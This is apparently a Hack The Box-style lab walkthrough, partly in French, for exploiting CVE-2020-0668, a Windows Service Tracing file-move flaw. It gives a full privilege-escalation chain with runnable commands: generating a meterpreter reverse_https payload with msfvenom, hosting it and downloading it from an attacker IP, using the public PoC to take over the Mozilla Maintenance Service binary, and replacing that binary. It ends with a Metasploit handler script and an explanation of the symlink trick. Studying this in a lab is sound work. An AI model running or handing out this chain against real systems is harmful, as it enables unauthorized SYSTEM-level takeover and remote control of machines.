# CVE-2020-0668

***

### <mark style="color:red;">CVE-2020-0668</mark>

{% hint style="warning" %}
**CVE-2020-0668 de Microsoft** : **vuln√©rabilit√© d'√©l√©vation de privil√®ges du noyau Windows**, qui exploite une **vuln√©rabilit√© de d√©placement arbitraire de fichier** en tirant parti de la **fonctionnalit√© de Service Tracing de Windows**.\
Le **Service Tracing** permet aux utilisateurs de **d√©panner les probl√®mes** li√©s aux services et modules en cours d'ex√©cution en g√©n√©rant des informations de d√©bogage.\
Ses param√®tres sont configurables via le **registre Windows**.

D√©finir une valeur **MaxFileSize personnalis√©e** qui est **inf√©rieure √† la taille du fichier** provoque le **renommage du fichier** avec une **extension .OLD** lorsque le service est d√©clench√©.\
Cette op√©ration de d√©placement est effectu√©e par **NT AUTHORITY\SYSTEM**, et peut √™tre **abus√©e pour d√©placer un fichier de notre choix** √† l‚Äôaide de **points de montage** et de **liens symboliques**
{% endhint %}

<mark style="color:green;">**Checking Current User Privileges**</mark>

```cmd-session
C:\htb> whoami /priv
```

<mark style="color:green;">**After Building Solution**</mark>

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```shell-session
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

{% hint style="info" %}
√Ä ce stade, nous pouvons utiliser l‚Äôexploit pour **cr√©er un fichier de notre choix dans un dossier prot√©g√©**, tel que `C:\Windows\System32`.\
Nous ne sommes **pas capables d‚Äô√©craser les fichiers Windows prot√©g√©s**.\
Cette **√©criture de fichier privil√©gi√©e** doit √™tre **encha√Æn√©e avec une autre vuln√©rabilit√©**, comme **UsoDllLoader** ou **DiagHub**, pour **charger la DLL** et **escalader nos privil√®ges**.

Cependant, la **technique UsoDllLoader peut ne pas fonctionner** si des **mises √† jour Windows sont en attente ou en cours d‚Äôinstallation**, et le **service DiagHub peut ne pas √™tre disponible**.

Nous pouvons √©galement chercher **un logiciel tiers** qui pourrait √™tre exploit√©, tel que le **Mozilla Maintenance Service**.\
Ce service **s‚Äôex√©cute dans le contexte SYSTEM** et peut √™tre **d√©marr√© par des utilisateurs non privil√©gi√©s**.\
Le **binaire (non prot√©g√© par le syst√®me)** pour ce service se trouve ici :\
`C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

**V√©rification des permissions sur le binaire**\
`icacls` confirme que nous avons uniquement **les permissions de lecture et d‚Äôex√©cution** sur ce binaire, comme indiqu√© par la ligne :\
`BUILTIN\Users:(I)(RX)` dans la sortie de la commande.
{% endhint %}

{% code fullWidth="true" %}
```cmd-session
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
{% endcode %}

<mark style="color:green;">**Generating Malicious Binary**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
{% endcode %}

<mark style="color:green;">**Hosting the Malicious Binary**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ $ python3 -m http.server 8080
```

<mark style="color:green;">**Downloading the Malicious Binary**</mark>

{% hint style="info" %}
For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.
{% endhint %}

{% code fullWidth="true" %}
```powershell-session
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```
{% endcode %}

<mark style="color:green;">**Running the Exploit**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       
```
{% endcode %}

<mark style="color:green;">**Checking Permissions of New File**</mark>

{% hint style="info" %}
The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.
{% endhint %}

{% code fullWidth="true" %}
```cmd-session
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                          BUILTIN\Administrators:(F)
                                                                          WINLPE-WS02\htb-student:(F)
```
{% endcode %}

<mark style="color:green;">**Replacing File with Malicious Binary**</mark>

{% hint style="warning" %}
We can overwrite the `maintenanceservice.exe` binary in `c:\Program Files (x86)\Mozilla Maintenance Service` with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to `C:\Users\htb-student\Desktop`, `maintenanceservice.exe` and `maintenanceservice2.exe`. Let's move the good copy that was not corrupted by the exploit `maintenanceservice2.exe` to the Program Files directory, making sure to rename the file properly and remove the `2` or the service won't start. The `copy` command will only work from a cmd.exe window, not a PowerShell console.
{% endhint %}

{% code fullWidth="true" %}
```cmd-session
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

```
{% endcode %}

<mark style="color:green;">**Metasploit Resource Script**</mark>

Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.

```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

<mark style="color:green;">**Launching Metasploit with Resource Script**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ sudo msfconsole -r handler.rc 
```

<mark style="color:green;">**Starting the Service**</mark>

```cmd-session
C:\htb> net start MozillaMaintenance
```

<mark style="color:green;">**Receiving a Meterpreter Session**</mark>

{% hint style="warning" %}
&#x20;<mark style="color:$warning;">**üîç D√©tail technique : comment on trompe le syst√®me**</mark>

Windows a une **fonction int√©gr√©e** appel√©e **Service Tracing**, qui est faite pour aider au d√©bogage de services.

Elle √©crit des fichiers de logs (traces) dans des chemins d√©finis via le **registre Windows**, notamment ici :

```
HKLM\Software\Microsoft\Tracing\<NomDuService>
```

Et dans cette cl√©, on peut d√©finir des choses comme :

* `FileDirectory` ‚Üí O√π stocker le log
* `MaxFileSize` ‚Üí Taille max avant qu‚Äôil renomme (genre `.OLD`)
* `EnableConsoleTracing`, `EnableFileTracing`, etc.

***

**üí° L‚Äôexploitation du m√©canisme**

Le **POC CVE-2020-0668** va faire ceci :

1. ‚úÖ Cr√©e une **cl√© de registre Tracing** pour un service **bidon** (que nous contr√¥lons).
2. ü™Ñ D√©finit `FileDirectory` vers un dossier o√π on peut jouer avec des **liens symboliques**.
3. üîó Cr√©e un **symlink sp√©cial** qui pointe vers un fichier SYSTEM (genre `Mozilla\maintenanceservice.exe`)
4. üß® D√©clenche le service de trace ‚Üí Windows va √©crire dans le log ‚Üí voit que c‚Äôest trop gros ‚Üí le renomme en `.OLD`
5. ‚ùó Mais il suit le symlink ‚Üí il renomme en fait un fichier SYSTEM ‚Üí et √ßa nous donne les droits `(F)` sur ce fichier-l√†.

***

**üóÇÔ∏è Exemple visuel**

Disons qu‚Äôon a fait √ßa :

```
C:\ExploitZone\MyLog -> lien symbolique vers "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Et dans le registre :

```
HKLM\Software\Microsoft\Tracing\FakeService
  - FileDirectory = C:\ExploitZone
  - MaxFileSize = 1
```

Alors Windows :

* pense que c‚Äôest un log normal dans `MyLog.log`
* voit que la taille d√©passe ‚Üí veut le renommer
* en fait il suit le lien ‚Üí **renomme maintenanceservice.exe**
* et comme c‚Äôest SYSTEM qui fait le move, **tu obtiens les permissions**

***

üí• En gros :

* üß† Le POC utilise le service de tracing pour que Windows SYSTEM **renomme un fichier qu‚Äôon choisit**, en le faisant **passer pour un log** via un lien symbolique + registre.

***
{% endhint %}
